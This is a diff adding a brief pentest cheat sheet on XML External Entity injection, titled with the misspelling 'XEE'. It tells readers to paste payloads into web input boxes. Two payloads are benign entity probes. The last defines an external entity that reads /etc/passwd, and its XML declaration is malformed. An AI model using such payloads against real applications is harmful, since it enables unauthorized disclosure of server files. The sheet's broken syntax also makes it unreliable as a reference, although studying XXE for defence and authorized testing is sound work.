@@ -1,0 +1,25 @@
+XEE-Attack
+
+Note - An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system.
+
+Input these examples in text input boxes to check for XEE (below)
+
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+<userInfo>
+ <firstName>falcon</firstName>
+ <lastName>&name;</lastName>
+</userInfo>
+
+
+
+<!DOCTYPE replace [<!ENTITY name "merp"> ]>
+<userInfo>
+<firstName>beep</firstName>
+<lastName>&name;</lastName>
+</userInfo>
+
+
+
+<?xml version="1.0" UTF?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
